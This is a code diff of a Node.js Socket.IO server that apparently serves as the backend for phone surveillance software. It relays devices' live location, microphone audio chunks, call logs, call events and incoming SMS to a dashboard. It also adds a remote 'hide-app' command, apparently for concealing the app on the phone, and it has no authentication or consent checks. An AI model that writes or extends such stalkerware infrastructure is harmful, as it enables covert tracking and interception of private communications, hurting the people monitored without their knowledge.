@@ -3,112 +3,89 @@ const http = require("http");
 const { Server } = require("socket.io");
 const path = require("path");
 
+const PORT = process.env.PORT || 5000;
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
 
-// Serve dashboard
-app.use(express.static(path.join(__dirname, "public"))); // keep your index.html inside /public
+const io = new Server(server, {
+  cors: { origin: "*" },
+});
+
+// Serve the dashboard UI from /public
+app.use(express.static(path.join(__dirname, "public")));
 
 // Track devices and listeners
-const devices = {};   // { deviceId: socketId }
-const listeners = []; // all dashboards
+const devices = new Set();
+const listeners = new Set();
 
 io.on("connection", (socket) => {
-  console.log("New client connected:", socket.id);
+  console.log(`🔌 Client connected: ${socket.id}`);
 
-  // Device registers itself
-  socket.on("device-register", (deviceId) => {
-    devices[deviceId] = socket.id;
-    console.log(`📱 Device registered: ${deviceId}`);
-    // Notify dashboards
-    listeners.forEach((listener) => {
-      listener.emit("device-registered", deviceId);
-    });
+  // Register device
+  socket.on("device-register", () => {
+    devices.add(socket.id);
+    console.log(`📱 Device registered: ${socket.id}`);
   });
 
-  // Dashboard registers itself
+  // Register listener (dashboard)
   socket.on("listener-register", () => {
-    console.log("🖥️ Dashboard connected:", socket.id);
-    listeners.push(socket);
-
-    // Send already registered devices
-    Object.keys(devices).forEach((deviceId) => {
-      socket.emit("device-registered", deviceId);
-    });
+    listeners.add(socket.id);
+    console.log(`🖥️ Listener registered: ${socket.id}`);
   });
 
-  // Location updates
+  // ---------------- HIDE/SHOW APP FEATURE ----------------
+  // Dashboard emits these events
+  socket.on("hide-app-server", () => {
+    console.log("👻 Dashboard requested to hide app");
+    devices.forEach((id) => io.to(id).emit("hide-app")); // send to all devices
+  });
+
+  socket.on("show-app-server", () => {
+    console.log("📲 Dashboard requested to show app");
+    devices.forEach((id) => io.to(id).emit("show-app")); // send to all devices
+  });
+  // -------------------------------------------------------
+
+  // Forward location updates
   socket.on("location-update", (data) => {
-    const { deviceId, lat, lng } = data;
-    console.log(`📍 Location from ${deviceId}: ${lat}, ${lng}`);
-    listeners.forEach((listener) => {
-      listener.emit("location-update", { deviceId, lat, lng });
-    });
+    console.log(`📍 Location from ${socket.id}:`, data);
+    listeners.forEach((id) => io.to(id).emit("location-update", data));
   });
 
-  // Audio stream
-  socket.on("audio-chunk", (data) => {
-    const { deviceId, base64Chunk } = data;
-    listeners.forEach((listener) => {
-      listener.emit("audio-chunk", { deviceId, base64Chunk });
-    });
+  // Forward audio chunks
+  socket.on("audio-chunk", (chunk) => {
+    console.log(`🎤 Audio chunk from ${socket.id}, size: ${chunk.length}`);
+    listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Call logs
-  socket.on("call-logs", (data) => {
-    const { deviceId, logs } = data;
-    listeners.forEach((listener) => {
-      listener.emit("call-logs", { deviceId, logs });
-    });
+  // Forward call logs
+  socket.on("call-logs", (logs) => {
+    console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
+    listeners.forEach((id) => io.to(id).emit("call-logs", logs));
   });
 
-  // Call events
-  socket.on("call-event", (data) => {
-    const { deviceId, event } = data;
-    listeners.forEach((listener) => {
-      listener.emit("call-event", { deviceId, event });
-    });
+  // Forward real-time call events
+  socket.on("call-event", (event) => {
+    console.log(`📞 Call event from ${socket.id}:`, event);
+    listeners.forEach((id) => io.to(id).emit("call-event", event));
   });
 
-  // SMS
-  socket.on("sms-received", (data) => {
-    const { deviceId, sms } = data;
-    listeners.forEach((listener) => {
-      listener.emit("sms-received", { deviceId, sms });
-    });
-  });
-
-  // Remote control (from dashboard → device)
-  socket.on("hide-app-server", ({ deviceId }) => {
-    const devSocketId = devices[deviceId];
-    if (devSocketId) io.to(devSocketId).emit("hide-app");
-  });
-
-  socket.on("show-app-server", ({ deviceId }) => {
-    const devSocketId = devices[deviceId];
-    if (devSocketId) io.to(devSocketId).emit("show-app");
+  // Forward real-time SMS messages
+  socket.on("sms-received", (sms) => {
+    console.log(`📨 SMS from ${socket.id}:`, sms);
+    listeners.forEach((id) => io.to(id).emit("sms-received", sms));
   });
 
   // Handle disconnect
   socket.on("disconnect", () => {
-    console.log("Client disconnected:", socket.id);
-
-    // If it was a device, remove from list
-    const deviceId = Object.keys(devices).find((id) => devices[id] === socket.id);
-    if (deviceId) {
-      delete devices[deviceId];
-      console.log(`❌ Device disconnected: ${deviceId}`);
-    }
-
-    // If it was a dashboard, remove from listeners
-    const idx = listeners.indexOf(socket);
-    if (idx !== -1) listeners.splice(idx, 1);
+    devices.delete(socket.id);
+    listeners.delete(socket.id);
+    console.log(`❌ Client disconnected: ${socket.id}`);
   });
 });
 
-// Start server
-const PORT = 3001;
 server.listen(PORT, () => {
-  console.log(`🚀 Server running on http://localhost:${PORT}`);
+  console.log(`🚀 Server listening on port ${PORT}`);
 });
+
+
